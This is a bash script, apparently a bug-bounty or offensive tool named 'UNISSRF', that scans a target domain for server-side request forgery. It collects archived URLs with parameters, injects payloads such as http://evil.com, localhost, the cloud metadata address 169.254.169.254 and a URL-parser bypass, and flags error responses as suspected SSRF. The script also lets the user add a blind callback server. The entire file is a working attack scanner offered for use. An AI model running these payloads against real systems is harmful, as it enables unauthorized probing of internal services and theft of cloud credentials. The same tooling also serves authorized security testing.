#!/bin/bash

echo -e "
██╗   ██╗███╗   ██╗██╗███████╗███████╗██████╗ ███████╗
██║   ██║████╗  ██║██║██╔════╝██╔════╝██╔══██╗██╔════╝
██║   ██║██╔██╗ ██║██║███████╗███████╗██████╔╝█████╗  
██║   ██║██║╚██╗██║██║╚════██║╚════██║██╔══██╗██╔══╝  
╚██████╔╝██║ ╚████║██║███████║███████║██║  ██║██║     
 ╚═════╝ ╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     
                                                     

----------------------------------------------------------
                     BY MON3M
----------------------------------------------------------
"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Payloads
COMMON_PARAMS=("url" "redirect" "next" "data" "dest" "reference" "site" "html" "continue" "domain" "callback" "return" "page")
DEFAULT_PAYLOADS=("http://evil.com" "http://127.0.0.1" "http://localhost" "http://169.254.169.254" "http://[::]" "http://evil.com#@localhost")
PAYLOADS=()
TARGETS=()

# Options
ALL_PARAMS=false
COMMON_ONLY=false
AUTO_MODE=false
CUSTOM_SERVER=""
SERVER_ONLY_URL=""

# Help message
usage() {
    echo -e "${YELLOW}Usage:${NC} $0 -u <url> | -l <file> [-a | -p] [-s <blind_url>] [--auto] [--server-only <url>]"
    echo -e "  -u <url>               : Scan a single target"
    echo -e "  -l <file>              : File contains list of targets"
    echo -e "  -a                     : Scan all parameters"
    echo -e "  -p                     : Scan only common parameters"
    echo -e "  -s <server_url>        : Add your server to default payloads"
    echo -e "  --auto                 : Use only built-in payloads (non-blind)"
    echo -e "  --server-only <url>    : Use only your server as the payload"
    exit 1
}

# Parse arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -u) TARGETS+=("$2"); shift ;;
        -l) while IFS= read -r line; do TARGETS+=("$line"); done < "$2"; shift ;;
        -a) ALL_PARAMS=true ;;
        -p) COMMON_ONLY=true ;;
        -s) CUSTOM_SERVER="$2"; shift ;;
        --auto) AUTO_MODE=true ;;
        --server-only) SERVER_ONLY_URL="$2"; shift ;;
        *) usage ;;
    esac
    shift
done

if [ ${#TARGETS[@]} -eq 0 ]; then
    usage
fi

# Determine payloads
if [ -n "$SERVER_ONLY_URL" ]; then
    PAYLOADS=("$SERVER_ONLY_URL")
elif [ "$AUTO_MODE" = true ]; then
    PAYLOADS=("${DEFAULT_PAYLOADS[@]}")
elif [ -n "$CUSTOM_SERVER" ]; then
    PAYLOADS=("${DEFAULT_PAYLOADS[@]}" "$CUSTOM_SERVER")
else
    PAYLOADS=("${DEFAULT_PAYLOADS[@]}")
fi

mkdir -p results

# Main scan loop
for target in "${TARGETS[@]}"; do
    domain=$(echo "$target" | awk -F/ '{print $3}')
    echo -e "${BLUE}[*] Fetching waybackurls for: $domain${NC}"
    waybackurls "$domain" > "results/$domain-raw.txt"

    echo -e "${BLUE}[*] Filtering URLs with parameters...${NC}"
    grep '?' "results/$domain-raw.txt" > "results/$domain-params.txt"
    urls=$(cat "results/$domain-params.txt")

    echo -e "${GREEN}[+] Starting SSRF scan on: $domain${NC}"

    while IFS= read -r url; do
        base=$(echo "$url" | cut -d'?' -f1)
        query=$(echo "$url" | cut -d'?' -f2)
        IFS='&' read -ra params <<< "$query"

        for param in "${params[@]}"; do
            key=$(echo "$param" | cut -d'=' -f1)

            if $COMMON_ONLY && [[ ! " ${COMMON_PARAMS[*]} " =~ " $key " ]]; then
                continue
            fi

            if $ALL_PARAMS || $COMMON_ONLY; then
                for payload in "${PAYLOADS[@]}"; do
                    test_url="${base}?${key}=${payload}"
                    echo -e "${YELLOW}[>] Testing: $test_url${NC}"
                    response=$(curl -s -o /dev/null -w "%{http_code}" "$test_url")

                    if [[ "$response" == "500" || "$response" == "502" || "$response" == "408" || "$response" == "504" ]]; then
                        echo -e "${RED}[!] Possible SSRF Detected:${NC}"
                        echo -e "URL     : ${BLUE}$test_url${NC}"
                        echo -e "Param   : ${YELLOW}$key${NC}"
                        echo -e "Payload : ${GREEN}$payload${NC}"
                        echo -e "Response: ${RED}$response${NC}"
                        echo "[$(date)] SSRF Suspect -> $test_url [$payload] => $response" >> "results/$domain-ssrf-log.txt"
                    fi
                done
            fi
        done
    done <<< "$urls"

    echo -e "${GREEN}[✓] Finished scanning $domain${NC}"
done

